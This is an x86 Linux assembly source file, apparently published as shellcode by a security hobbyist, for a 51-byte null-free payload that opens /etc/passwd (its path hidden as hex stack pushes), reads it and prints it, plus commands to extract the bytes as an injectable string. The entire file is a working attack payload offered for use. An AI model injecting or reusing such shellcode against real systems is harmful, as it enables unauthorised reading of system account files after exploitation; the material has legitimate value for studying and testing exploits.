
; Tiny Read File - Assembly Language - Linux/x86
; Copyright (C) 2013 Geyslan G. Bem, Hacking bits
;
;   http://hackingbits.com
;   geyslan@gmail.com
;
; This program is free software: you can redistribute it and/or modify
; it under the terms of the GNU General Public License as published by
; the Free Software Foundation, either version 3 of the License, or
; (at your option) any later version.
;
; This program is distributed in the hope that it will be useful,
; but WITHOUT ANY WARRANTY; without even the implied warranty of
; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
; GNU General Public License for more details.
;
; You should have received a copy of the GNU General Public License
; along with this program.  If not, see <http://www.gnu.org/licenses/>.


;   tiny_read_file
;
;   * 51 bytes
;   * null-free
;   * read 4096 bytes from /etc/passwd file
;
;   # nasm -f elf32 tiny_read_file.asm
;   # ld -m elf_i386 tiny_read_file.o -o tiny_read_file
;   # for i in $(objdump -d tiny_read_file |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo

global _start

section .text

_start:

	; int open(const char *pathname, int flags);

	xor ecx, ecx
	mul ecx
	mov al, 5
	push ecx
	push 0x64777373
	push 0x61702f63
	push 0x74652f2f
	mov ebx, esp
	int 0x80

	; ssize_t read(int fd, void *buf, size_t count);

	xchg eax, ebx
	xchg ecx, eax
	mov al, 3
	xor edx, edx
	mov dx, 4095
	inc edx
	int 0x80

	; ssize_t write(int fd, const void *buf, size_t count);

	xchg edx, eax
	xor eax, eax
	mov al, 4
	mov bl, 1
	int 0x80

	; void _exit(int status);
  
	xchg eax, ebx
	int 0x80
